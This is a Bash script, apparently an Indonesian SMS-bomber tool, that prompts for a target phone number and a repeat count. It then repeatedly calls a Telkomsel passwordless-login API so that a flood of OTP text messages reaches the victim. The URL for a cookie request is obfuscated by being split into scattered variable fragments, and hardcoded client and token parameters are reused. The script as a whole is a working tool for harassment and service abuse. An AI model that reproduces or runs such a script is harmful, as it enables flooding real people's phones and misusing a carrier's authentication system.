# EDITED dontbescared

b="\033[34;1m"
 p="\033[39;1m"
  k="\033[33;1m"
   m="\033[31;1m"
    h="\033[32;1m"
     c="\033[35;1m"
      pu="\033[36;1m"
       x="\033[30;1m"
        o="\033[0m"
        
function check(){
		if \
		[ \
		-z \
		$(command \
		-v \
		curl) \
		];then
		printf "${p}[${m}!${p}]${m}curl belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install curl\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
		fi;y="://"
		
		if \
		[ \
		-z \
		$(command \
		-v \
		bash) \
		];then
		printf "${p}[${m}!${p}]${m}curl belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install bash\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit;l="d"
		fi;i="tps";a="un"
		
		if \
		[ \
		-z \
		$(command \
		-v \
		python2) \
		];then
		printf "${p}[${m}!${p}]${m}curl belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install python2\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
		fi
		
}
check;wq="st"
as="o.i"
spam(){
    for \
    (( \
    loop \
    = \
    0; \
    loop \
    <= \
    $jummax; \
    loop++ \
    )); \
    do
        cookie=$(\
        t="ht"
        curl \
        -s \
        "$f$t$i$y$l$a$w$d$xz$tr$as$ak$ka$wq$cx" \
        -i \
        | \
        grep \
        -o \
        "cfduid=.*," \
        | \
        cut \
        -d " " \
        -f1\
        )
        otp=$(\
        curl \
        -s \
        -L \
        "https://accounts.telkomsel.com/passwordless/start" \
        -H \
        "Cookie: $cookie" \
        -H \
        "Content-Type: application/json" \
        -H \
        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru-RU;q=0.6,ru;q=0.5,ar-EG;q=0.4,ar;q=0.3" \
        -d \
        '{"client_id":"up5hA4GuDeaWwR6AFASpiRgJS3r39J4M","connection":"sms","send":"code","phone_number":"'"$no"'","authParams":{"response_type":"token id_token","redirect_uri":"https://duniagames.co.id/callback","scope":"openid profile email read:users read:current_user update:current_user_identities update:users","audience":"https://accounts.telkomsel.com/api/v2/","state":".0jsbHRfDpuPd3oz0tUI40xAaV9ftPec","nonce":"PHCM8Q4D5~ZU7F4EqyhPg3.Zb-vS9EFh"}}' \
        --user-agent \
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36" \
        | \
        grep \
        -Ec \
        "+[0-9]{0,15}" \
        );w="ia"
        d="ga";ak="d/r"
        if \
        [[ \
        $otp \
        == \
        "1" \
        ]]; \
        then
        	sleep \
        	15
            printf \
            "${p}[${h}$loop${p}] Spaming SMS To ${pu}$no ${m}(${h}Berhasil${m})\n"
            xz="me"
        else
            printf \
            "\n$otp\n"
            printf \
            "${p}[${h}$loop${p}] Spaming SMS To ${pu}$no ${p}(${m}Gagal${p})\n"
        fi
    done
   # printf "\nthe maximum amount of spams has been reached, amount of spams = $loop\n\n";cx="er"
}
f="h";tr="s.c"
banner(){
clear
printf "\t${p}╔═╗╔═╗────────   ${k}Notipy-ID\n"
printf "\t${p}║═╣║╬║╔═╗─╔══╗ ${h} █▄░█   ▀ █▀▄\n"
printf "\t${p}╠═║║╔╝║╬╚╗║║║║ ${h} █░▀█   █ █░█\n"
printf "\t${p}╚═╝╚╝─╚══╝╚╩╩╝ ${h} ▀░░▀ ${m}█${h} ▀ ▀▀░\n"
printf "\t${p}  ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
printf "\t${p}     EDITED${m}:${c} D0NTBESC4RED${p}\n"
printf "\t${m}     *\033[30;1mGALBAY MANIA${m}*\n"
printf "\t${p}  ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
printf "\t${p}       ©2023DONTBESCARED\n\n\n\n"
}
	ka="egi"
	banner
	printf \
	"\t${h}Unlimited${p} *_* ${m}&"
	printf \
	"\t${p}All Oprator\n"
    printf \
    "\n\n${b}╔════════════════════════╗ \n"
    printf \
    "${b}║${p}NO TARGET${m}:${pu} " \
    number
    read \
    number;
    printf \
    "${b}╚════════════════════════╝\n"    
    printf \
    "${b}╔════════════════════════╗ \n"
    printf \
    "${b}║${p}JUMLAH ${m}:${pu} " \
    jummax
    read \
    jummax;
    printf \
    "${b}╚════════════════════════╝\n"    
    if \
    [[ \
    ${number:0:1} \
    == \
    "0" \
    ]]; \
    then
    no="+62${number:1:15}"
    spam
    elif \
    [[ \
    ${number:0:2} \
    == \
    "62" \
    ]]; \
    then
    no="+${number:0:15}"
    spam
    elif \
    [[ \
    ${number:0:3} \
    == \
    "+62" \
    ]]; \
    then
    no="$number"
    spam
    else 
    printf \
    "${p}[${m}!${p}] ${m}Invalid Number!!\n\n"
    fi
